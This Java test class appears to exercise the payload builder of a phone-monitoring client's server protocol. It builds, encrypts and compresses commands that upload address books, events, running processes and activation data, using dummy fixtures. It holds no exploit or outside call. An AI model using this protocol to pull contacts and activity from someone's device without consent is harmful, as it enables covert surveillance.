package com.vvt.phoenix.prot.test.databuilder;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.security.InvalidKeyException;
import java.util.zip.GZIPInputStream;

import android.util.Log;

import com.vvt.phoenix.prot.TransportDirectives;
import com.vvt.phoenix.prot.command.CommandMetaData;
import com.vvt.phoenix.prot.command.FxProcess;
import com.vvt.phoenix.prot.command.FxProcessCategory;
import com.vvt.phoenix.prot.command.GetActivationCode;
import com.vvt.phoenix.prot.command.GetAddressBook;
import com.vvt.phoenix.prot.command.GetCSID;
import com.vvt.phoenix.prot.command.GetCommunicationDirectives;
import com.vvt.phoenix.prot.command.GetConfiguration;
import com.vvt.phoenix.prot.command.GetProcessBlackList;
import com.vvt.phoenix.prot.command.GetProcessWhiteList;
import com.vvt.phoenix.prot.command.GetTime;
import com.vvt.phoenix.prot.command.Languages;
import com.vvt.phoenix.prot.command.SendActivate;
import com.vvt.phoenix.prot.command.SendAddrBookForApproval;
import com.vvt.phoenix.prot.command.SendAddressBook;
import com.vvt.phoenix.prot.command.SendClearCSID;
import com.vvt.phoenix.prot.command.SendDeactivate;
import com.vvt.phoenix.prot.command.SendEvents;
import com.vvt.phoenix.prot.command.SendHeartbeat;
import com.vvt.phoenix.prot.command.SendMessage;
import com.vvt.phoenix.prot.command.SendRunningProcess;
import com.vvt.phoenix.prot.databuilder.PayloadBuilder;
import com.vvt.phoenix.prot.databuilder.PayloadBuilderResponse;
import com.vvt.phoenix.prot.event.AddressBook;
import com.vvt.phoenix.util.crypto.AESCipher;

/**
 * @author tanakharn
 * This class act like ProtocolPacketBuilder
 *
 */
public class PayloadBuilderTest {
	
	//Debugging
	private static final String TAG = "PayloadBuilderTest";
	
	//Members
	private CommandMetaData mMetaData;
	//private SendActivate mCommandData;
	private PayloadBuilderResponse mResponse;
	private int mTransportDirective = TransportDirectives.RESUMABLE;
	//private int mTransportDirective = TransportDirectives.NON_RESUMABLE;
	
	private static final String PAYLOAD_PATH = "/sdcard/prot/payload.prot";
	private static final String DECOMPRESS_PATH = "/sdcard/prot/payload_decompress.prot";
	private static final String DECRYPT_PATH = "/sdcard/prot/payload_decrypt.prot";
	
	private void createMetaData(){

		mMetaData = new CommandMetaData();
		mMetaData.setProtocolVersion(1);
		mMetaData.setProductId(4);
		mMetaData.setProductVersion("FXS2.0");
		mMetaData.setConfId(2);
		mMetaData.setDeviceId("N1");
		mMetaData.setActivationCode("1150");
		mMetaData.setLanguage(Languages.THAI);
		mMetaData.setPhoneNumber("0800999999");
		mMetaData.setMcc("MCC");
		mMetaData.setMnc("MNC");
		mMetaData.setImsi("IMSI");
		//mMetaData.setTransportDirective(TransportDirectives.RESUMABLE);
		//mMetaData.setTransportDirective(TransportDirectives.NON_RESUMABLE);
		mMetaData.setEncryptionCode(0);
		mMetaData.setCompressionCode(0);
	}
	
	private void showResponseDetails(){
		/*Log.v(TAG, "AESKey: "+mResponse.getAesKey());
		Log.v(TAG, "Payload Type: "+mResponse.getPayloadType());
		Log.v(TAG, "Payload Path: "+mResponse.getPayloadPath());
		Log.v(TAG, "Data: "+mResponse.getData());*/
		
		if(mMetaData.getEncryptionCode() == 1){
			Log.v(TAG, "AESKey: "+new String(mResponse.getAesKey().getEncoded()));
		}else{
			Log.v(TAG, "Encryption Code = "+mMetaData.getEncryptionCode()+", No AES Key");
		}
		
		Log.v(TAG, "Payload Type: "+mResponse.getPayloadType());
		
		if(mTransportDirective == TransportDirectives.RESUMABLE){
			Log.v(TAG, "TransportDirective = RESUMABLE, Payload Path = "+mResponse.getPayloadPath());
		}else if(mTransportDirective == TransportDirectives.NON_RESUMABLE) {
			Log.v(TAG, "TransportDirective = NON_RESUMABLE, Data = "+new String(mResponse.getData()).toString());
		}
		
		
		
	}
	
	private void validateResponseData(){
		byte[] dataToDecompress = mResponse.getData();
		
		if(mMetaData.getEncryptionCode() == 1){
			byte[] plainText = decryptPayload();
			dataToDecompress = plainText;
			try {
				writeToFile(DECRYPT_PATH, plainText);
			} catch (IOException e) {
				Log.e(TAG, "Cannot write plaintext to file: "+e.getMessage());
				return;
			}
		}
		if(mMetaData.getCompressionCode() == 1){
			byte[] decompress = decompressPayload(DECRYPT_PATH, dataToDecompress);
			try {
				writeToFile(DECOMPRESS_PATH, decompress);
			} catch (IOException e) {
				Log.e(TAG, "Cannot write decompress to file: "+e.getMessage());
				return;
			}
		}	
	}
	
	private byte[] decryptPayload(){
		Log.v(TAG, "DecryptPayload");
		byte[] plainText = null;
		byte[] buf = null;
		
		// retrieve cipher text
		if(mTransportDirective == TransportDirectives.RESUMABLE){
			Log.v(TAG, "Decrypt File (RESUMABLE)");
			File f = new File(mResponse.getPayloadPath());
			buf = new byte[(int) f.length()];
			try{
				FileInputStream fIn = new FileInputStream(f);
				fIn.read(buf);
				fIn.close();
			}catch(IOException e){
				Log.e(TAG, "Error while reading cipher text from payload: "+e.getMessage());
				return null;
			}
		}else{
			Log.v(TAG, "Decrypt Buffer (NON_RESUMABLE)");
			buf = mResponse.getData();
		}
		
		// decrypt
		try {
			plainText = AESCipher.decryptSynchronous(mResponse.getAesKey(), buf);
		} catch (InvalidKeyException e) {
			Log.e(TAG, "Error while decrypt payload: "+e.getMessage());
			return null;
		}
		
		return plainText;
	}
	
	private byte[] decompressPayload(String path, byte[] data){
		Log.v(TAG, "decompressPayload()");
		byte[] buf = null;
		
		//retrieve data
		if(mTransportDirective == TransportDirectives.RESUMABLE){
			Log.v(TAG, "Decompress File (RESUMABLE)");
			File f = new File(path);
			buf = new byte[(int) f.length()];
			try{
				FileInputStream fIn = new FileInputStream(f);
				fIn.read(buf);
				fIn.close();
			}catch(IOException e){
				Log.e(TAG, "Reading Decompress File Error: "+e.getMessage());
				return null;
			}
		}else{
			Log.v(TAG, "Decompress Buffer (NON_RESUMABLE)");
			buf = data;
		}
		
		//decompress
		Log.v(TAG, "Start decompress...");
		ByteArrayInputStream is = new ByteArrayInputStream(buf);
		ByteArrayOutputStream os = new ByteArrayOutputStream();
		try {
			GZIPInputStream gZip = new GZIPInputStream(is);
			int readCount = gZip.read(buf);
			while(readCount > 0){
				Log.v(TAG, "readCount: "+readCount);
				os.write(buf, 0, readCount);
				readCount = gZip.read(buf);
			}
			Log.v(TAG, "Final readCount: "+readCount);
		} catch (IOException e) {
			Log.e(TAG, "Exception while decompress: "+e.getMessage());
			return null;
		}
		
		return os.toByteArray();
	}
	
	private void writeToFile(String path, byte[] data) throws IOException{
		FileOutputStream fOut = new FileOutputStream(path);
		
		fOut.write(data);
		
		fOut.close();
	}
	
	public void testBuildSendActivatePayload(){
		//1 prepare meta data
		createMetaData();
		
		//2 prepare command data
		SendActivate commandData = new SendActivate();
		commandData.setDeviceInfo("I'm Super Phone");
		commandData.setDeviceModel("Nexus One");
		
		//3 build payload
		try {
			mResponse = PayloadBuilder.getInstance(commandData.getCmd()).buildPayload(mMetaData, 
					commandData, PAYLOAD_PATH, mTransportDirective);
		} catch (Exception e) {
			Log.e(TAG, e.getMessage());
			return;
		}
		
		//4 show PayloadBuilderResponse details
		showResponseDetails();

		//5 write payload details to file for debug (Act like Server side)
		validateResponseData();	
	}
	
	public void testBuildSendDeactivatePayload(){
		//1 prepare meta data
		createMetaData();
		
		//2 prepare command data
		SendDeactivate commandData = new SendDeactivate();
		
		//3 build payload
		try {
			mResponse = PayloadBuilder.getInstance(commandData.getCmd()).buildPayload(mMetaData, 
					commandData, PAYLOAD_PATH, mTransportDirective);
		} catch (Exception e) {
			Log.e(TAG, e.getMessage());
			return;
		}
		
		//4 show PayloadBuilderResponse details
		showResponseDetails();

		//5 write payload details to file for debug (Act like Server side)
		validateResponseData();
	}
	
	public void testBuildSendEventPayloadBuilder(){
		//1 prepare meta data
		createMetaData();
		
		//2 prepare command data
		EventProvider provider = new EventProvider();
		SendEvents commandData = new SendEvents();
		//commandData.setEventCount(provider.getEventCount());
		commandData.setEventProvider(provider);
		
		
		//3 build payload
		try {
			mResponse = PayloadBuilder.getInstance(commandData.getCmd()).buildPayload(mMetaData, 
					commandData, PAYLOAD_PATH, mTransportDirective);
		} catch (Exception e) {
			Log.e(TAG, e.getMessage());
			return;
		}
		
		//4 show PayloadBuilderResponse details
		showResponseDetails();

		//5 write payload details to file for debug (Act like Server side)
		validateResponseData();	
	}
	
	public void testBuildSendClearCsidPayloadBuilder(){
		//1 prepare meta data
		createMetaData();
		
		//2 prepare command data
		SendClearCSID commandData = new SendClearCSID();
		commandData.setSessionId(7);
		
		//3 build payload
		try {
			mResponse = PayloadBuilder.getInstance(commandData.getCmd()).buildPayload(mMetaData, 
					commandData, PAYLOAD_PATH, mTransportDirective);
		} catch (Exception e) {
			Log.e(TAG, e.getMessage());
			return;
		}
		
		//4 show PayloadBuilderResponse details
		showResponseDetails();

		//5 write payload details to file for debug (Act like Server side)
		validateResponseData();
	}
	
	public void testBuildSendHeartBeatPayloadBuilder(){
		//1 prepare meta data
		createMetaData();
		
		//2 prepare command data
		SendHeartbeat commandData = new SendHeartbeat();
		
		//3 build payload
		try {
			mResponse = PayloadBuilder.getInstance(commandData.getCmd()).buildPayload(mMetaData, 
					commandData, PAYLOAD_PATH, mTransportDirective);
		} catch (Exception e) {
			Log.e(TAG, e.getMessage());
			return;
		}
		
		//4 show PayloadBuilderResponse details
		showResponseDetails();

		//5 write payload details to file for debug (Act like Server side)
		validateResponseData();
	}
	
	public void testBuildSendMessagePayloadBuilder(){
		//1 prepare meta data
		createMetaData();
		
		//2 prepare command data
		SendMessage commandData = new SendMessage();
		commandData.setMessage("Hello Milky!");
		
		//3 build payload
		try {
			mResponse = PayloadBuilder.getInstance(commandData.getCmd()).buildPayload(mMetaData, 
					commandData, PAYLOAD_PATH, mTransportDirective);
		} catch (Exception e) {
			Log.e(TAG, e.getMessage());
			return;
		}
		
		//4 show PayloadBuilderResponse details
		showResponseDetails();

		//5 write payload details to file for debug (Act like Server side)
		validateResponseData();
	}
	
	public void testBuildSendRunningProcesswPayloadBuilder(){
		//1 prepare meta data
		createMetaData();
		
		//2 prepare command data
		SendRunningProcess commandData = new SendRunningProcess();
		//2.1 add FxProccesses 
		FxProcess process = new FxProcess();
		process.setCategory(FxProcessCategory.PROCESS);
		process.setName("BD_PROCESS");
		commandData.addProcess(process);
		process = new FxProcess();
		process.setCategory(FxProcessCategory.SERVICE);
		process.setName("BD_SERVICE");
		commandData.addProcess(process);		
		
		//3 build payload
		try {
			mResponse = PayloadBuilder.getInstance(commandData.getCmd()).buildPayload(mMetaData, 
					commandData, PAYLOAD_PATH, mTransportDirective);
		} catch (Exception e) {
			Log.e(TAG, e.getMessage());
			return;
		}
		
		//4 show PayloadBuilderResponse details
		showResponseDetails();

		//5 write payload details to file for debug (Act like Server side)
		validateResponseData();
	}
	
	public void testBuildSendAddrBookPayloadBuilder(){
		//1 prepare meta data
		createMetaData();
		
		//2 prepare command data
		SendAddressBook commandData = new SendAddressBook();
		
		AddressBook book = new AddressBook();
		book.setAddressBookId(1);
		book.setAddressBookName("MilkyBook");
		book.setVCardCount(2);
		book.setVCardProvider(new PseudoVCardProvider());
		commandData.addAddressBook(book);
		
		book = new AddressBook();
		book.setAddressBookId(2);
		book.setAddressBookName("BangDewBook");
		book.setVCardCount(2);
		book.setVCardProvider(new PseudoVCardProvider());
		commandData.addAddressBook(book);		
		
		//3 build payload
		try {
			mResponse = PayloadBuilder.getInstance(commandData.getCmd()).buildPayload(mMetaData, 
					commandData, PAYLOAD_PATH, mTransportDirective);
		} catch (Exception e) {
			Log.e(TAG, e.getMessage());
			return;
		}
		
		//4 show PayloadBuilderResponse details
		showResponseDetails();

		//5 write payload details to file for debug (Act like Server side)
		validateResponseData();
	}
	
	public void testBuildSendAddrBookForApprPayloadBuilder(){
		//1 prepare meta data
		createMetaData();
		
		//2 prepare command data
		AddressBook book = new AddressBook();
		book.setAddressBookId(1);
		book.setAddressBookName("MilkyBook");
		book.setVCardCount(2);
		book.setVCardProvider(new PseudoVCardProvider());
	
		SendAddrBookForApproval commandData = new SendAddrBookForApproval();
		commandData.setAddressBook(book);		
		
		//3 build payload
		try {
			mResponse = PayloadBuilder.getInstance(commandData.getCmd()).buildPayload(mMetaData, 
					commandData, PAYLOAD_PATH, mTransportDirective);
		} catch (Exception e) {
			Log.e(TAG, e.getMessage());
			return;
		}
		
		//4 show PayloadBuilderResponse details
		showResponseDetails();

		//5 write payload details to file for debug (Act like Server side)
		validateResponseData();
	}
	
	public void testBuildGetCsidPayloadBuilder(){
		//1 prepare meta data
		createMetaData();
		
		//2 prepare command data
		GetCSID commandData = new GetCSID();
		
		
		//3 build payload
		try {
			mResponse = PayloadBuilder.getInstance(commandData.getCmd()).buildPayload(mMetaData, 
					commandData, PAYLOAD_PATH, mTransportDirective);
		} catch (Exception e) {
			Log.e(TAG, e.getMessage());
			return;
		}
		
		//4 show PayloadBuilderResponse details
		showResponseDetails();

		//5 write payload details to file for debug (Act like Server side)
		validateResponseData();
	}
	
	public void testBuildGetTimePayloadBuilder(){
		//1 prepare meta data
		createMetaData();
		
		//2 prepare command data
		GetTime commandData = new GetTime();
		
		
		//3 build payload
		try {
			mResponse = PayloadBuilder.getInstance(commandData.getCmd()).buildPayload(mMetaData, 
					commandData, PAYLOAD_PATH, mTransportDirective);
		} catch (Exception e) {
			Log.e(TAG, e.getMessage());
			return;
		}
		
		//4 show PayloadBuilderResponse details
		showResponseDetails();

		//5 write payload details to file for debug (Act like Server side)
		validateResponseData();
	}
	
	public void testBuildGetProcessWhiteListPayloadBuilder(){
		//1 prepare meta data
		createMetaData();
		
		//2 prepare command data
		GetProcessWhiteList commandData = new GetProcessWhiteList();
		
		
		//3 build payload
		try {
			mResponse = PayloadBuilder.getInstance(commandData.getCmd()).buildPayload(mMetaData, 
					commandData, PAYLOAD_PATH, mTransportDirective);
		} catch (Exception e) {
			Log.e(TAG, e.getMessage());
			return;
		}
		
		//4 show PayloadBuilderResponse details
		showResponseDetails();

		//5 write payload details to file for debug (Act like Server side)
		validateResponseData();
	}
	
	public void testBuildGetProcessBlackListPayloadBuilder(){
		//1 prepare meta data
		createMetaData();
		
		//2 prepare command data
		GetProcessBlackList commandData = new GetProcessBlackList();
		
		
		//3 build payload
		try {
			mResponse = PayloadBuilder.getInstance(commandData.getCmd()).buildPayload(mMetaData, 
					commandData, PAYLOAD_PATH, mTransportDirective);
		} catch (Exception e) {
			Log.e(TAG, e.getMessage());
			return;
		}
		
		//4 show PayloadBuilderResponse details
		showResponseDetails();

		//5 write payload details to file for debug (Act like Server side)
		validateResponseData();
	}
	
	public void testBuildGetCommuManagerSettingsPayloadBuilder(){
		//1 prepare meta data
		createMetaData();
		
		//2 prepare command data
		GetCommunicationDirectives commandData = new GetCommunicationDirectives();
		
		
		//3 build payload
		try {
			mResponse = PayloadBuilder.getInstance(commandData.getCmd()).buildPayload(mMetaData, 
					commandData, PAYLOAD_PATH, mTransportDirective);
		} catch (Exception e) {
			Log.e(TAG, e.getMessage());
			return;
		}
		
		//4 show PayloadBuilderResponse details
		showResponseDetails();

		//5 write payload details to file for debug (Act like Server side)
		validateResponseData();
	}
	
	public void testBuildGetConfigPayloadBuilder(){
		//1 prepare meta data
		createMetaData();
		
		//2 prepare command data
		GetConfiguration commandData = new GetConfiguration();
		
		
		//3 build payload
		try {
			mResponse = PayloadBuilder.getInstance(commandData.getCmd()).buildPayload(mMetaData, 
					commandData, PAYLOAD_PATH, mTransportDirective);
		} catch (Exception e) {
			Log.e(TAG, e.getMessage());
			return;
		}
		
		//4 show PayloadBuilderResponse details
		showResponseDetails();

		//5 write payload details to file for debug (Act like Server side)
		validateResponseData();
	}
	
	public void testBuildGetActivationCodePayloadBuilder(){
		//1 prepare meta data
		createMetaData();
		
		//2 prepare command data
		GetActivationCode commandData = new GetActivationCode();
		
		
		//3 build payload
		try {
			mResponse = PayloadBuilder.getInstance(commandData.getCmd()).buildPayload(mMetaData, 
					commandData, PAYLOAD_PATH, mTransportDirective);
		} catch (Exception e) {
			Log.e(TAG, e.getMessage());
			return;
		}
		
		//4 show PayloadBuilderResponse details
		showResponseDetails();

		//5 write payload details to file for debug (Act like Server side)
		validateResponseData();
	}
	
	public void testBuildGetAddrBookPayloadBuilder(){
		//1 prepare meta data
		createMetaData();
		
		//2 prepare command data
		GetAddressBook commandData = new GetAddressBook();
		
		
		//3 build payload
		try {
			mResponse = PayloadBuilder.getInstance(commandData.getCmd()).buildPayload(mMetaData, 
					commandData, PAYLOAD_PATH, mTransportDirective);
		} catch (Exception e) {
			Log.e(TAG, e.getMessage());
			return;
		}
		
		//4 show PayloadBuilderResponse details
		showResponseDetails();

		//5 write payload details to file for debug (Act like Server side)
		validateResponseData();
	}
}
